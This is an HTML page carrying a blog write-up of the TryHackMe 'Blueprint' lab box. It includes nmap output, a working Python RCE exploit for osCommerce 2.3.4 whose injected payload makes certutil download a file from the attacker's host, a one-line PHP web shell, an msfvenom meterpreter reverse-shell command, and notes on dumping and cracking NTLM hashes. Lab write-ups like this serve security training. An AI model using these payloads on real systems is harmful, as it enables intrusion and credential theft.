@@ -1,0 +1,218 @@
+
+<head>
+    <meta charset="utf-8">
+
+    <title>BluePrint TryHackMe | write-up</title>
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <link rel="shortcut icon" href="../../favicon.png" type="image/png">
+    <link rel="canonical" href="../index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="BluePrint TryHackMe | write-up">
+    <meta property="og:description" content="Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note: 	 &quot;Do you have what is takes to hack into this Windows Machine?&quot; ENUMERATION TIMEroot@kali:~# nmap -sC -sV 10.10.41.176 Starting Nmap 7.80 ( https://nmap.">
+    <meta property="og:url" content="http://localhost:2368/blueprint-tryhackme-write-up/">
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/blueprint.jpg">
+    <meta property="article:published_time" content="2020-04-11T13:09:40.000Z">
+    <meta property="article:modified_time" content="2020-04-11T16:00:42.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="BluePrint TryHackMe | write-up">
+    <meta name="twitter:description" content="Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note: 	 &quot;Do you have what is takes to hack into this Windows Machine?&quot; ENUMERATION TIMEroot@kali:~# nmap -sC -sV 10.10.41.176 Starting Nmap 7.80 ( https://nmap.">
+    <meta name="twitter:url" content="http://localhost:2368/blueprint-tryhackme-write-up/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/blueprint.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="1950">
+    <meta property="og:image:height" content="1300">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "http://localhost:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "http://localhost:2368/content/images/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "http://localhost:2368/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "BluePrint TryHackMe | write-up",
+    "url": "http://localhost:2368/blueprint-tryhackme-write-up/",
+    "datePublished": "2020-04-11T13:09:40.000Z",
+    "dateModified": "2020-04-11T16:00:42.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://localhost:2368/content/images/2020/04/blueprint.jpg",
+        "width": 1950,
+        "height": 1300
+    },
+    "description": "Hello everyone, today&#x27;s is really fun rated as easy, and we get no hints or\ninstruction, only one question as a note:\n\n &quot;Do you have what is takes to hack into this Windows Machine?&quot;\n\n&gt; ENUMERATION TIME\nroot@kali:~# nmap -sC -sV 10.10.41.176\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC\nNmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)\nHost is up (0.00042s latency).\nNot shown: 991 closed ports\nPORT      STATE SERVICE     VERSION\n135/tcp   open  msrp",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.13">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../../rss/index.html">
+
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,600,400">
+    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace, monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0, 0, 0, 0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather", serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans", sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-moz-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1;-o-font-feature-settings:"dlig" 1, "liga" 1, "lnum" 1, "kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-moz-font-feature-settings:"liga" 1, "onum" 1, "kern" 1;-o-font-feature-settings:"liga" 1, "onum" 1, "kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata, monospace, sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata, monospace, sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0, 0, 0, 0.2), 0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans", sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans", sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans", sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans", sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    <script async custom-element="amp-anim" src="https://cdn.ampproject.org/v0/amp-anim-0.1.js"></script>
+<script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
+
+</head>
+
+<body class="amp-template">
+    <header class="main-header">
+        <nav class="blog-title">
+            <a href="../../">fr33s0ul</a>
+        </nav>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">BluePrint TryHackMe | write-up</h1>
+                <section class="post-meta">
+                    <p class="author">by <a href="../../author/fr33s0ul/">fr33s0ul</a></p>
+                    <time class="post-date" datetime="2020-04-11">2020-04-11</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="http://localhost:2368/content/images/2020/04/blueprint.jpg" width="600" height="400" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p>Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note:</p><p>	 <strong>"Do you have what is takes to hack into this Windows Machine?"</strong></p><blockquote>ENUMERATION TIME</blockquote><pre><code>root@kali:~# nmap -sC -sV 10.10.41.176
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC
+Nmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)
+Host is up (0.00042s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE     VERSION
+135/tcp   open  msrpc       Microsoft Windows RPC
+139/tcp   open  netbios-ssn Windows 7 Home Basic 7601 Service Pack 1 netbios-ssn
+443/tcp   open  ssl/http    Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+3306/tcp  open  mysql       MariaDB (unauthorized)
+8080/tcp  open  http        Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+49152/tcp open  msrpc       Microsoft Windows RPC
+49153/tcp open  msrpc       Microsoft Windows RPC
+49154/tcp open  msrpc       Microsoft Windows RPC
+49158/tcp open  msrpc       Microsoft Windows RPC
+MAC Address: 02:B2:F0:03:D8:00 (Unknown)
+Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
+|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:b2:f0:03:d8:00 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: BLUEPRINT
+|   NetBIOS computer name: BLUEPRINT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-04-11T13:44:15+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-11T12:44:16
+|_  start_date: 2020-04-11T12:43:15
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+root@kali:~# 
+</code></pre><p>we have a lot of ports open, the most attractive one for more recon is port 8080</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>we can see that it's hosting a oscommerce-2.3.4</figcaption></figure><figure class="kg-card kg-image-card"></figure><p>diving in the directory we found, leads us to this ugly e-shopping website, next thing we need to do, accumulate data about the version of the oscommerce and examine if it's vulnerable to anything.</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>and we have some goodies over here, went through each one and the RCE one seems compatible with our target and well documented</figcaption></figure><figure class="kg-card kg-image-card"></figure><p>the exploit is written with python, we modified the script with the target we have and the specific port, the directory of the exploitable <strong>install.php</strong> should be the same, or it won't work, here exactly where fundamentals in coding are really important, it helps a lot following the exploit which leads to understanding why exactly it is exploitable and with that knowledge, you can modify or even create you own script write it in bash or any preferable language ... I suggest for anyone just starting in the field to gain some coding skills.</p><figure class="kg-card kg-code-card"><pre><code class="language-python">import requests
+
+# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
+base_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/"
+target_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
+
+data = {
+    'DIR_FS_DOCUMENT_ROOT': './'
+}
+
+# the payload will be injected into the configuration file via this code
+# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
+# so the format for the exploit will be: '); PAYLOAD; /*
+
+payload = '\');'
+payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
+payload += 'echo $var;'
+payload += '/*'
+
+
+data['DB_DATABASE'] = payload
+
+# exploit it
+r = requests.post(url=target_url, data=data)
+
+if r.status_code == 200:
+    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
+else:
+    print("[-] Exploit did not execute as planned")</code></pre><figcaption>shell.php contains | &lt;?php $cmd=$_GET['cmd']; system($cmd);?&gt;</figcaption></figure><p>The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.</p><p>running the file <strong>configure.php</strong> in the directory <strong>/oscommerce-2.3.4/catalog/install/inclues/</strong> will execute our pushed payload and upload our shell</p><figure class="kg-card kg-image-card kg-card-hascaption"><figcaption>I use python to create a simple server to share files.</figcaption></figure><figure class="kg-card kg-image-card"></figure><p>I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator</p><amp-iframe src="https://giphy.com/embed/3q7cjJmyZv7lS" width="480" height="362" frameborder="0" class="giphy-embed" allowfullscreen sandbox="allow-scripts allow-same-origin" layout="responsive"></amp-iframe><p><a href="https://giphy.com/gifs/admin-nowadays-3q7cjJmyZv7lS"></a></p><p>Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &gt; Service_system_update.exe</code></pre><p>the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the <strong>configure.php</strong> file from the includes directory.</p><pre><code>payload = '\');'
+payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
+payload += 'echo $var;'
+payload += '/*'</code></pre><p></p><figure class="kg-card kg-image-card"></figure><figure class="kg-card kg-image-card"></figure><p>to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the <strong>NTLM</strong> hash of the user Lab, the password is very common you can decrypt it just in <strong>crackstation.net</strong>, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.</p><p>Happy Hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://crackstation.net/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</div><div class="kg-bookmark-description">Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...</div><div class="kg-bookmark-metadata"><span class="kg-bookmark-publisher">MD5, SHA1, Linux, Rainbow Tables, etc.</span></div></div><div class="kg-bookmark-thumbnail"><amp-anim src="https://crackstation.net/images/1by1.gif" width="1" height="1" layout="fixed"></amp-anim></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"><div class="kg-bookmark-content"><div class="kg-bookmark-title">osCommerce 2.3.4.1 - Remote Code Execution</div><div class="kg-bookmark-description">osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" width="16" height="16" layout="fixed"></amp-img><span class="kg-bookmark-author">Simon Scannell</span><span class="kg-bookmark-publisher">Exploit Database</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://www.exploit-db.com/images/spider-orange.png" width="144" height="144" layout="fixed"></amp-img></div></a></figure>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="../../">fr33s0ul</a> © 2020</section>
+        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
+    </footer>
+</body>
